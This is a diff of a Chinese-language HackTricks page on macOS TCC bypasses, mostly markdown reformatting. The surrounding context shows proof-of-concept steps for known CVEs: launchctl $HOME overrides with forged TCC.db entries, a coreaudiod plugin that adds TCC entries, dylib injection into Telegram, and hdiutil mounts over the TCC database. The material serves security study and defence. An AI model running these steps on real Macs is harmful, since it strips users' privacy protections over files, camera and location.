@@ -1,4 +1,4 @@
-# macOS TCC绕过
+# macOS TCC Bypasses
 
 <details>
 
@@ -6,11 +6,11 @@
 
 支持HackTricks的其他方式：
 
-- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-- 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
-- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
@@ -19,6 +19,7 @@
 ### 写入绕过
 
 这不是绕过，这只是TCC的工作原理：**它不会阻止写入**。如果终端**无法访问用户的桌面以读取内容，它仍然可以写入其中**：
+
 ```shell-session
 username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
@@ -28,13 +29,14 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
+
 **扩展属性 `com.apple.macl`** 被添加到新的 **文件** 中，以便让 **创建者的应用** 能够读取它。
 
 ### TCC 点击劫持
 
-可以**将一个窗口覆盖在 TCC 提示框上**，使用户在不知情的情况下**接受**它。您可以在 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** 中找到 PoC**。
+可以**将一个窗口覆盖在 TCC 提示框上**，使用户在不知情的情况下**接受**它。您可以在 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)\*\* 中找到 PoC\*\*。
 
-<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/cn/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
 
 ### 通过任意名称请求 TCC
 
@@ -75,7 +77,7 @@ asd
 
 **iMovie** 和 **Garageband** 具有此授权以及其他授权。
 
-有关从该授权中获取 icloud 令牌的漏洞的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+有关从该授权中获取 icloud 令牌的漏洞的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / 自动化
 
@@ -87,7 +89,7 @@ asd
 [macos-apple-scripts.md](macos-apple-scripts.md)
 {% endcontent-ref %}
 
-例如，如果一个应用程序具有**对 `iTerm` 的自动化权限**，例如在此示例中**`Terminal`** 具有对 iTerm 的访问权限：
+例如，如果一个应用程序具有**对 `iTerm` 的自动化权限**，例如在此示例中\*\*`Terminal`\*\* 具有对 iTerm 的访问权限：
 
 <figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -108,12 +110,15 @@ end tell
 end tell
 ```
 {% endcode %}
+
 ```bash
 osascript iterm.script
 ```
+
 #### 通过Finder
 
 或者，如果一个应用程序可以通过Finder访问，它可以执行类似这样的脚本：
+
 ```applescript
 set a_user to do shell script "logname"
 tell application "Finder"
@@ -123,6 +128,7 @@ set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alia
 end tell
 do shell script "rm " & POSIX path of (copyFile as alias)
 ```
+
 ## 通过应用程序行为
 
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
@@ -132,6 +138,7 @@ do shell script "rm " & POSIX path of (copyFile as alias)
 根据[这篇 Stack Exchange 帖子](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)，由于 TCC 守护程序是通过 `launchd` 在当前用户域中运行的，可以**控制传递给它的所有环境变量**。\
 因此，**攻击者可以在 `launchctl` 中设置 `$HOME` 环境** 变量指向一个**受控** **目录**，**重新启动** **TCC** 守护程序，然后**直接修改 TCC 数据库**，以获取**所有可用的 TCC 权限**，而无需提示最终用户。\
 PoC:
+
 ```bash
 # reset database just in case (no cheating!)
 $> tccutil reset All
@@ -158,6 +165,7 @@ NULL,
 # list Documents directory without prompting the end user
 $> ls ~/Documents
 ```
+
 ### CVE-2021-30761 - Notes
 
 Notes可以访问TCC受保护的位置，但是当创建一个笔记时，它会**创建在一个非受保护的位置**。因此，您可以要求Notes将受保护的文件复制到一个笔记中（因此在非受保护的位置），然后访问该文件：
@@ -166,34 +174,36 @@ Notes可以访问TCC受保护的位置，但是当创建一个笔记时，它会
 
 ### CVE-2021-30782 - Translocation
 
-二进制文件`/usr/libexec/lsd`与库`libsecurity_translocate`具有授权`com.apple.private.nullfs_allow`，允许其创建**nullfs**挂载，并具有授权`com.apple.private.tcc.allow`与**`kTCCServiceSystemPolicyAllFiles`**以访问每个文件。
+二进制文件`/usr/libexec/lsd`与库`libsecurity_translocate`具有授权`com.apple.private.nullfs_allow`，允许其创建**nullfs**挂载，并具有授权`com.apple.private.tcc.allow`与\*\*`kTCCServiceSystemPolicyAllFiles`\*\*以访问每个文件。
 
-可以向“Library”添加隔离属性，调用**`com.apple.security.translocation`** XPC服务，然后将Library映射到**`$TMPDIR/AppTranslocation/d/d/Library`**，其中Library中的所有文档都可以**访问**。
+可以向“Library”添加隔离属性，调用\*\*`com.apple.security.translocation`\*\* XPC服务，然后将Library映射到\*\*`$TMPDIR/AppTranslocation/d/d/Library`**，其中Library中的所有文档都可以**访问\*\*。
 
 ### CVE-2023-38571 - 音乐和电视 <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>
 
-**`Music`**有一个有趣的功能：当它运行时，它会将拖放到**`~/Music/Music/Media.localized/Automatically Add to Music.localized`**的文件导入到用户的“媒体库”中。此外，它调用类似于：**`rename(a, b);`**其中`a`和`b`为：
+\*\*`Music`**有一个有趣的功能：当它运行时，它会将拖放到**`~/Music/Music/Media.localized/Automatically Add to Music.localized`**的文件导入到用户的“媒体库”中。此外，它调用类似于：**`rename(a, b);`\*\*其中`a`和`b`为：
 
 * `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
 * `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`
 
-这个**`rename(a, b);`**行为容易受到**竞争条件**的影响，因为可以在`Automatically Add to Music.localized`文件夹中放入一个伪造的**TCC.db**文件，然后当创建新文件夹(b)时，复制文件，删除它，并将其指向**`~/Library/Application Support/com.apple.TCC`**/。
+这个\*\*`rename(a, b);`**行为容易受到**竞争条件**的影响，因为可以在`Automatically Add to Music.localized`文件夹中放入一个伪造的**TCC.db**文件，然后当创建新文件夹(b)时，复制文件，删除它，并将其指向**`~/Library/Application Support/com.apple.TCC`\*\*/。
 
 ### SQLITE\_SQLLOG\_DIR - CVE-2023-32422
 
-如果**`SQLITE_SQLLOG_DIR="path/folder"`**基本上意味着**任何打开的数据库都会被复制到该路径**。在这个CVE中，这个控制被滥用，以便在将要由具有FDA TCC数据库的进程打开的**SQLite数据库**中**写入**，然后滥用**`SQLITE_SQLLOG_DIR`**与**文件名中的符号链接**，因此当该数据库被**打开**时，用户的**TCC.db被覆盖**为已打开的数据库。\
+如果\*\*`SQLITE_SQLLOG_DIR="path/folder"`**基本上意味着**任何打开的数据库都会被复制到该路径\*\*。在这个CVE中，这个控制被滥用，以便在将要由具有FDA TCC数据库的进程打开的**SQLite数据库**中**写入**，然后滥用\*\*`SQLITE_SQLLOG_DIR`**与**文件名中的符号链接\*\*，因此当该数据库被**打开**时，用户的**TCC.db被覆盖**为已打开的数据库。\
 **更多信息**[**在写作中**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html)**和**[**在讲座中**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s)。
 
 ### **SQLITE\_AUTO\_TRACE**
 
-如果设置了环境变量**`SQLITE_AUTO_TRACE`**，库**`libsqlite3.dylib`**将开始**记录**所有SQL查询。许多应用程序使用这个库，因此可以记录它们所有的SQLite查询。
+如果设置了环境变量\*\*`SQLITE_AUTO_TRACE`**，库**`libsqlite3.dylib`**将开始**记录\*\*所有SQL查询。许多应用程序使用这个库，因此可以记录它们所有的SQLite查询。
 
 几个苹果应用程序使用这个库来访问TCC受保护的信息。
+
 ```bash
 # Set this env variable everywhere
 launchctl setenv SQLITE_AUTO_TRACE 1
 ```
-### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407
+
+### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407
 
 这个**环境变量被`Metal`框架使用**，它是各种程序的依赖，尤其是`Music`，它具有FDA。
 
@@ -239,11 +249,11 @@ launchctl setenv SQLITE_AUTO_TRACE 1
 
 ## 通过**NFSHomeDirectory**
 
-TCC在用户的HOME文件夹中使用数据库来控制用户特定资源的访问，位于**$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
-因此，如果用户设法使用指向**不同文件夹**的$HOME环境变量重新启动TCC，用户可以在**/Library/Application Support/com.apple.TCC/TCC.db**中创建一个新的TCC数据库，并欺骗TCC授予任何应用程序任何TCC权限。
+TCC在用户的HOME文件夹中使用数据库来控制用户特定资源的访问，位于\*\*$HOME/Library/Application Support/com.apple.TCC/TCC.db\*\*。\
+因此，如果用户设法使用指向**不同文件夹**的$HOME环境变量重新启动TCC，用户可以在\*\*/Library/Application Support/com.apple.TCC/TCC.db\*\*中创建一个新的TCC数据库，并欺骗TCC授予任何应用程序任何TCC权限。
 
 {% hint style="success" %}
-请注意，Apple使用存储在用户配置文件中的设置来作为**`NFSHomeDirectory`**属性的值，因此，如果您入侵了具有修改此值权限的应用程序（**`kTCCServiceSystemPolicySysAdminFiles`**），您可以使用TCC绕过**武器化**此选项。
+请注意，Apple使用存储在用户配置文件中的设置来作为\*\*`NFSHomeDirectory`**属性的值，因此，如果您入侵了具有修改此值权限的应用程序（**`kTCCServiceSystemPolicySysAdminFiles`**），您可以使用TCC绕过**武器化\*\*此选项。
 {% endhint %}
 
 ### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>
@@ -254,15 +264,15 @@ TCC在用户的HOME文件夹中使用数据库来控制用户特定资源的访�
 
 **第一个POC**使用[dsexport](https://www.unix.com/man-page/osx/1/dsexport/)和[dsimport](https://www.unix.com/man-page/osx/1/dsimport/)来修改用户的**HOME**文件夹。
 
-1. 为目标应用程序获取_csreq_ blob。
-2. 放置一个带有所需访问权限和_csreq_ blob的虚假_TCC.db_文件。
+1. 为目标应用程序获取\_csreq\_ blob。
+2. 放置一个带有所需访问权限和\_csreq\_ blob的虚假\_TCC.db\_文件。
 3. 使用[dsexport](https://www.unix.com/man-page/osx/1/dsexport/)导出用户的目录服务条目。
 4. 修改目录服务条目以更改用户的主目录。
 5. 使用[dsimport](https://www.unix.com/man-page/osx/1/dsimport/)导入修改后的目录服务条目。
-6. 停止用户的_tccd_并重新启动该进程。
+6. 停止用户的\_tccd\_并重新启动该进程。
 
-第二个POC使用了**`/usr/libexec/configd`**，其中具有值为`kTCCServiceSystemPolicySysAdminFiles`的`com.apple.private.tcc.allow`权限。\
-通过使用**`-t`**选项运行**`configd`**，攻击者可以指定要加载的**自定义Bundle**。因此，该漏洞**替换了**使用**`configd`代码注入**更改用户主目录的**`dsexport`**和**`dsimport`**方法。
+第二个POC使用了\*\*`/usr/libexec/configd`**，其中具有值为`kTCCServiceSystemPolicySysAdminFiles`的`com.apple.private.tcc.allow`权限。**\
+**通过使用**`-t`**选项运行**`configd`**，攻击者可以指定要加载的**自定义Bundle\*\*。因此，该漏洞**替换了**使用\*\*`configd`代码注入**更改用户主目录的**`dsexport`**和**`dsimport`\*\*方法。
 
 有关更多信息，请查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)。
 
@@ -279,16 +289,18 @@ TCC在用户的HOME文件夹中使用数据库来控制用户特定资源的访�
 
 ### CVE-2020-27937 - Directory Utility
 
-应用程序`/System/Library/CoreServices/Applications/Directory Utility.app`具有权限**`kTCCServiceSystemPolicySysAdminFiles`**，加载带有**`.daplug`**扩展名的插件，并且**没有启用强化**运行时。
+应用程序`/System/Library/CoreServices/Applications/Directory Utility.app`具有权限\*\*`kTCCServiceSystemPolicySysAdminFiles`**，加载带有**`.daplug`**扩展名的插件，并且**没有启用强化\*\*运行时。
 
-为了武器化此CVE，**`NFSHomeDirectory`**被**更改**（滥用先前的权限），以便能够**接管用户的TCC数据库**以绕过TCC。
+为了武器化此CVE，**`NFSHomeDirectory`被更改**（滥用先前的权限），以便能够**接管用户的TCC数据库**以绕过TCC。
 
 有关更多信息，请查看[**原始报告**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)。
+
 ### CVE-2020-29621 - Coreaudiod
 
 二进制文件 **`/usr/sbin/coreaudiod`** 具有权限 `com.apple.security.cs.disable-library-validation` 和 `com.apple.private.tcc.manager`。第一个权限允许**进行代码注入**，第二个权限允许其访问**管理 TCC**。
 
 该二进制文件允许从文件夹 `/Library/Audio/Plug-Ins/HAL` 加载**第三方插件**。因此，可以使用以下 PoC **加载插件并滥用 TCC 权限**：
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -315,11 +327,12 @@ add_tcc_entry();
 NSLog(@"[+] Exploitation finished...");
 exit(0);
 ```
+
 有关更多信息，请查阅[**原始报告**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)。
 
 ### 设备抽象层（DAL）插件
 
-通过核心媒体I/O（具有**`kTCCServiceCamera`**的应用程序）打开摄像头流的系统应用程序会在`/Library/CoreMediaIO/Plug-Ins/DAL`中加载**这些插件**（不受SIP限制）。
+通过核心媒体I/O（具有\*\*`kTCCServiceCamera`**的应用程序）打开摄像头流的系统应用程序会在`/Library/CoreMediaIO/Plug-Ins/DAL`中加载**这些插件\*\*（不受SIP限制）。
 
 只需在那里存储一个具有常见**构造函数**的库即可用于**注入代码**。
 
@@ -328,6 +341,7 @@ exit(0);
 ### Firefox
 
 Firefox应用程序具有`com.apple.security.cs.disable-library-validation`和`com.apple.security.cs.allow-dyld-environment-variables`权限：
+
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -353,6 +367,7 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 </dict>
 </plist>
 ```
+
 ### CVE-2020-10006
 
 二进制文件 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` 具有权限 **`com.apple.private.tcc.allow`** 和 **`com.apple.security.get-task-allow`**，这允许注入代码到进程中并使用 TCC 权限。
@@ -362,6 +377,7 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 电报具有权限 **`com.apple.security.cs.allow-dyld-environment-variables`** 和 **`com.apple.security.cs.disable-library-validation`**，因此可以滥用它来**获取其权限**，例如使用摄像头录制。您可以在[**写作中找到有效载荷**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。
 
 请注意如何使用环境变量加载库，创建了一个**自定义 plist** 来注入此库，并使用 **`launchctl`** 来启动它：
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -391,15 +407,17 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 ```bash
 launchctl load com.telegram.launcher.plist
 ```
+
 ## 通过打开调用
 
-即使在受沙盒限制的情况下，也可以调用**`open`**
+即使在受沙盒限制的情况下，也可以调用\*\*`open`\*\*
 
 ### 终端脚本
 
-在技术人员使用的计算机上，通常会为终端授予**完全磁盘访问权限（FDA）**，并且可以使用它来调用**`.terminal`**脚本。
+在技术人员使用的计算机上，通常会为终端授予**完全磁盘访问权限（FDA）**，并且可以使用它来调用\*\*`.terminal`\*\*脚本。
 
-**`.terminal`** 脚本是类似于以下具有要在**`CommandString`**键中执行的命令的属性列表文件：
+**`.terminal`** 脚本是类似于以下具有要在\*\*`CommandString`\*\*键中执行的命令的属性列表文件：
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -417,7 +435,9 @@ launchctl load com.telegram.launcher.plist
 </dict>
 </plist>
 ```
+
 一个应用程序可以在诸如 /tmp 这样的位置编写一个终端脚本，并使用如下命令启动它：
+
 ```objectivec
 // Write plist in /tmp/tcc.terminal
 [...]
@@ -428,6 +448,7 @@ task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
 exploit_location]; task.standardOutput = pipe;
 [task launch];
 ```
+
 ## 通过挂载
 
 ### CVE-2020-9771 - mount\_apfs TCC绕过和提权
@@ -462,6 +483,7 @@ ls /tmp/snap/Users/admin_user # This will work
 ### CVE-2021-1784 & CVE-2021-30808 - 在TCC文件上挂载
 
 即使TCC DB文件受到保护，也可以**在目录上挂载**一个新的TCC.db文件：
+
 ```bash
 # CVE-2021-1784
 ## Mount over Library/Application\ Support/com.apple.TCC
@@ -471,7 +493,7 @@ hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TC
 ## Mount over ~/Library
 hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
 ```
-{% endcode %}
+
 ```python
 # This was the python function to create the dmg
 def create_dmg():
@@ -482,16 +504,17 @@ os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
 os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
 os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 ```
+
 查看[**原始报告**](https://theevilbit.github.io/posts/cve-2021-30808/)中的**完整利用**。
 
 ### asr
 
-工具**`/usr/sbin/asr`**允许复制整个磁盘并在另一个位置挂载，绕过了TCC保护。
+工具\*\*`/usr/sbin/asr`\*\*允许复制整个磁盘并在另一个位置挂载，绕过了TCC保护。
 
 ### 位置服务
 
-在**`/var/db/locationd/clients.plist`**中有第三个TCC数据库，用于指示允许访问**位置服务**的客户端。\
-文件夹**`/var/db/locationd/`没有受到DMG挂载的保护**，因此可以挂载我们自己的plist。
+在\*\*`/var/db/locationd/clients.plist`**中有第三个TCC数据库，用于指示允许访问**位置服务**的客户端。**\
+**文件夹**`/var/db/locationd/`没有受到DMG挂载的保护\*\*，因此可以挂载我们自己的plist。
 
 ## 通过启动应用程序
 
